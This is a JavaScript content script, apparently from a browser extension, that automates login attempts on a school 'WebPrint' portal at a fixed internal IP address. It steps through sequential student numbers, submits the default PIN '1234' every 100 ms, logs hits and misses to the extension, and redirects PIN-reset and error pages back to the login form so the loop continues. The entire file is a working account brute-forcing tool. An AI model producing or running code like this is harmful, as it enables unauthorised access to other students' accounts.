if (window.location.pathname == '/WebPrint/Account/GetPIN') {
    chrome.storage.sync.get('bruteForce', (data) => {
        if (data.bruteForce == true) {
            document.getElementById('Password').value = '1234';
            document.getElementById('btnSubmit').click();
            setTimeout(() => {
                if (document.getElementsByClassName('error')[0].innerHTML == 'The Student NR or PIN provided is incorrect.') {
                    chrome.runtime.sendMessage({
                        from: 'content',
                        subject: 'fail'
                    });
                }
                window.location = 'http://10.250.80.17/WebPrint/Account/LogOn';
            }, 100);
        } else {
            console.log('Brute force off');
            return;
        }
    });
}

if (window.location.pathname == '/WebPrint/Account/ResetPIN') {
    window.location = 'http://10.250.80.17/WebPrint/Account/LogOn';
}

if (window.location.pathname == '/WebPrint/Error/Show') {
    window.location = 'http://10.250.80.17/WebPrint/Account/LogOn';
}

if (window.location.pathname == '/WebPrint/') {
    chrome.storage.sync.get('bruteForce', (data) => {
        if (data.bruteForce == true) {
            chrome.runtime.sendMessage({
                from: 'content',
                subject: 'success'
            });
            document.getElementsByTagName('a')[0].click();
        } else {
            return;
        }
    });
}

function go(Lastamount) {
    chrome.storage.sync.get('bruteForce', (data) => {
        if (data.bruteForce == true) {
            document.getElementById('UserName').value = Lastamount;
            document.getElementById('UserName').value++;
            console.log('Trying Account: ' + document.getElementById('UserName').value);
            chrome.runtime.sendMessage({
                from: 'content',
                subject: 'try',
                id: document.getElementById('UserName').value
            });
            document.getElementById('btnSubmit').click();
        setTimeout(() => {
            go(document.getElementById('UserName').value);
        }, 100);
        } else {
            return;
        }
    });
}

function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,    
    function(m,key,value) {
      vars[key] = value;
    });
    return vars;
}

if (window.location.pathname == '/WebPrint/Account/LogOn') {
        document.getElementById('RememberMe').value = true;
        chrome.storage.sync.get('bruteForce', (data) => {
            if (data.bruteForce == true) {
                go(document.getElementById('UserName').value++);
            } else {
                
            }
        });
}